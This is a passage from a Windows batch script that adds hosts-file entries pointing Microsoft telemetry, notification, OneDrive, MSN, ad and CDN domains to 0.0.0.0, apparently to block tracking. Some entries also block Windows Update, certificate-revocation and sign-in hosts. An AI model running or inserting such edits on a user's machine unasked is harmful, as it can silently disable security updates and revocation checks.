echo 0.0.0.0 bn4sch101120818.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn4sch101120911.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn4sch101120913.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 BN4SCH101121017.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn4sch101121019.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 BN4SCH101121022.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn4sch101121109.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn4sch101121118.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn4sch101121223.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 BN4SCH101121318.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn4sch101121407.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn4sch101121618.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn4sch101121704.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn4sch101121709.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn4sch101121714.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn4sch101121908.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn4sch101122117.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn4sch101122310.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn4sch101122312.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn4sch101122421.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 BN4SCH101123006.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn4sch101123108.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn4sch101123110.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn4sch101123202.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn4sch102110124.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn1304-e.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn1306-a.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn1306-e.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn1306-g.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bnsch020022361.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 browser.events.data.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 browser.pipe.aria.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bs.serving-sys.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 by3301-a.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 by3301-c.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 by3301-e.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 c-0001.c-msedge.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 c-0001.dc-msedge.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 c.atdmt.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 c.go.mpulse.net.cdn.cloudflare.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 c.msn.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 c.msn.com.nsatc.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ca.telemetry.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cache.datamart.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cdn.atdmt.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cdn.globalsign.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds10.stn.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds26.ams9.msecn.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds38.ory.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds54.ory.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds177.dus.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds299.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds308.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds310.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds405.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds406.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds407.fra.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds416.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds421.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds422.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds425.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds426.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds447.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds458.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds459.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds461.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds468.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds469.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds471.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds483.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds484.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds489.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds493.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds494.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds812.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds815.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds818.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds832.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds836.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds840.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds843.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds857.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds868.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds869.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds1203.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds1204.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds1209.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds1219.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds1228.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds1244.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds1257.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds1265.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds1269.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds1273.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds1285.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds1287.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds1289.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds1293.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds1307.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds1310.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds1325.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds1327.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds20005.stn.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds20404.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds20411.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds20415.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds20416.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds20417.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds20424.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds20425.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds20431.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds20435.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds20440.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds20443.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds20445.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds20450.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds20452.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds20457.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds20461.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds20469.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds20475.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds20482.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds20485.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds20495.lcy.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds21205.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds21207.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds21225.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds21229.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds21233.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds21238.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds21244.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds21249.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds21256.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds21257.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds21258.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds21261.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds21267.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds21278.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds21281.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds21293.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds21309.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds21313.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds21321.lon.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds30027.stn.llnw.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ch1-cor001.api.p001.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ch1-cor002.api.p001.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ch3301-c.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ch3301-e.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ch3301-g.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ch3302-c.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ch3302-e.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 choice.live.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 choice.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 choice.microsoft.com.nsatc.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 choice.microsoft.com.nstac.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 client.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 compatexchange1.trafficmanager.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 compatexchange.cloudapp.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 continuum.dds.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 corp.sts.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 corpext.msitadfs.glbdns2.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cp101-prod.do.dsp.mp.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 crl.globalsign.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cs1.wpc.v0cdn.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cs9.wac.phicdn.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cy2.displaycatalog.md.mp.microsoft.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cy2.licensing.md.mp.microsoft.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cy2.settings.data.microsoft.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cy2.vortex.data.microsoft.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 db3aqu.atdmt.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 db3wns2011111.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 db5-eap.settings-win.data.microsoft.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 db5.displaycatalog.md.mp.microsoft.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 db5.md.mp.microsoft.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 db5.settings-win.data.microsoft.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 db5.settings.data.microsoft.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 db5.vortex.data.microsoft.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 db5.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 db5sch101100917.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 db5sch101101511.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 db5sch101101813.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 db5sch101101914.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 db5sch101101939.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 db5sch101110626.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 db5sch101110634.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 db5sch101110821.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 db5sch101110822.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 db5sch103082111.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 db5sch103082406.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 db5sch103092209.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 db5wns1d.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 db6sch102091105.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 db6sch102091412.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 dc.services.visualstudio.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 dev.virtualearth.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 df.telemetry.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 diagnostics.support.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 directory.services.live.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 directory.services.live.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 dm3p.wns.notify.windows.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 dmd.metaservices.microsoft.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 dns.msftncsi.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 download-ssl.msgamestudios.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 dt.adsafeprotected.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 e87.dspb.akamaiedge.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 e1706.g.akamaiedge.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 e4578.b.akamaiedge.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 e8218.dscb1.akamaiedge.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 e9946.g.akamaiedge.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 e12358.g.akamaiedge.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 e-0009.e-msedge.net#ALSO USED IN MSOFFICE   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ec.atdmt.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ecn.dev.virtualearth.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 en-us.appex-rf.msn.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 eu-v10.events.data.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 eu-v20.events.data.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 eu.vortex-win.data.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 eu.vortex.data.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 events.data.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 fe2.update.microsoft.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 feedback.microsoft-hohm.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 feedback.search.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 feedback.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 fg.download.windowsupdate.com.c.footprint.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 flex.msn.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 fw.adsafeprotected.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 g.msn.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 g.msn.com.nsatc.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 geo-prod.do.dsp.mp.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 geo.prod.dodsp.mp.microsoft.com.nsatc.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 geo.settings-win.data.microsoft.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 geo.settings.data.microsoft.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 geo.vortex.data.microsoft.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 geoprod.dodsp.mp.microsoft.com.nsatc.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 geover-prod.do.dsp.mp.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 go.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 googleads4.g.doubleclick.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 gpla1.wac.v2cdn.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 h1.msn.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 h2.msn.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2.settings.data.microsoft.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130020721.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130020723.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130020726.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130020729.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130020732.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130020824.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130020843.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130020851.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130020854.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130020855.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130020924.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130020936.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130020940.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130020956.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130020958.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130020961.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021017.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021029.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021035.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021137.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021142.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021153.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021217.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021246.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021249.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021260.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021264.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021322.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021323.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021329.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021334.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021360.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021432.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021433.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021435.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021437.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021440.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021450.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021518.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021523.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021526.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021527.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021544.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
